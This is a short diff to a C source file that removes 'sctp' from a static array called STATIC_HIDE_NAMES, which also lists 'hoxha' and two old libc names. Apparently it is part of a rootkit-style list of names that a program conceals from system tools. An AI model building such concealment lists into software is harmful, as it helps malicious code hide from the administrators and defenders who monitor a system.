@@ -16,7 +16,6 @@ static const char *STATIC_HIDE_NAMES[] = {
     "hoxha",
     "libc.so.5",
     "libc.so.4",
-    "sctp",
     NULL
 };
 
